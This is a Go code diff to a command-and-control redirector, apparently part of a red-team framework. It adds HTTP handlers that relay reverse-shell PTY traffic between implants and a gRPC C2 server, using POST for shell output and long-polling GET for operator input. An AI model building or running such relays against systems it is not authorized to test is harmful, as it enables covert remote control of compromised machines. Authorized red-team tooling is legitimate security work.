@@ -64,6 +64,9 @@ func httpRedirectorRun(ctx context.Context, upstream string, options ...func(*Co
 	mux.HandleFunc("/c2.C2/ReportFile", func(w http.ResponseWriter, r *http.Request) {
 		handleReportFileStreaming(w, r, conn)
 	})
+	mux.HandleFunc("/c2.C2/ReverseShell", func(w http.ResponseWriter, r *http.Request) {
+		handleReverseShell(w, r, conn)
+	})
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		handleHTTPRequest(w, r, conn)
 	})
@@ -292,6 +295,91 @@ func handleReportFileStreaming(w http.ResponseWriter, r *http.Request, conn *grp
 	if _, err := w.Write(responseBody); err != nil {
 		fmt.Printf("[HTTP Write Error] %v\n", err)
 	}
+}
+
+func handleReverseShell(w http.ResponseWriter, r *http.Request, conn *grpc.ClientConn) {
+	if r.Method == http.MethodPost {
+		// Handle POST: Client sending PTY output to server
+		handleReverseShellPost(w, r, conn)
+	} else if r.Method == http.MethodGet {
+		// Handle GET: Long-polling for PTY input from server
+		handleReverseShellGet(w, r, conn)
+	} else {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	}
+}
+
+func handleReverseShellPost(w http.ResponseWriter, r *http.Request, conn *grpc.ClientConn) {
+	fmt.Printf("[ReverseShell POST] Sending PTY output to server\n")
+
+	// Read the encrypted request body
+	requestBody, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to read request body: %v", err), http.StatusBadRequest)
+		return
+	}
+	defer r.Body.Close()
+
+	// Forward to gRPC server using unary call (simpler than streaming for individual messages)
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	var responseBody []byte
+	err = conn.Invoke(
+		ctx,
+		"/c2.C2/ReverseShell",
+		requestBody,
+		&responseBody,
+		grpc.CallContentSubtype("raw"),
+	)
+
+	if err != nil {
+		fmt.Printf("[gRPC Error] %v\n", err)
+		http.Error(w, fmt.Sprintf("gRPC call failed: %v", err), http.StatusInternalServerError)
+		return
+	}
+
+	// Return empty success response
+	w.Header().Set("Content-Type", "application/grpc")
+	w.WriteHeader(http.StatusOK)
+}
+
+func handleReverseShellGet(w http.ResponseWriter, r *http.Request, conn *grpc.ClientConn) {
+	fmt.Printf("[ReverseShell GET] Long-polling for PTY input\n")
+
+	// Create a long-running context for long polling
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	// Make a gRPC call to get pending PTY input (server should hold connection until data available)
+	var responseBody []byte
+	err := conn.Invoke(
+		ctx,
+		"/c2.C2/ReverseShell",
+		[]byte{}, // Empty request for polling
+		&responseBody,
+		grpc.CallContentSubtype("raw"),
+	)
+
+	if err != nil {
+		fmt.Printf("[gRPC Error] %v\n", err)
+		http.Error(w, fmt.Sprintf("gRPC call failed: %v", err), http.StatusInternalServerError)
+		return
+	}
+
+	// Return the PTY input data with gRPC framing
+	w.Header().Set("Content-Type", "application/grpc")
+	w.WriteHeader(http.StatusOK)
+
+	// Write gRPC frame header
+	var frameHeader [5]byte
+	frameHeader[0] = 0x00 // No compression
+	binary.BigEndian.PutUint32(frameHeader[1:], uint32(len(responseBody)))
+
+	w.Write(frameHeader[:])
+	w.Write(responseBody)
+
+	fmt.Printf("[ReverseShell GET] Returned %d bytes\n", len(responseBody))
 }
 
 func handleHTTPRequest(w http.ResponseWriter, r *http.Request, conn *grpc.ClientConn) {
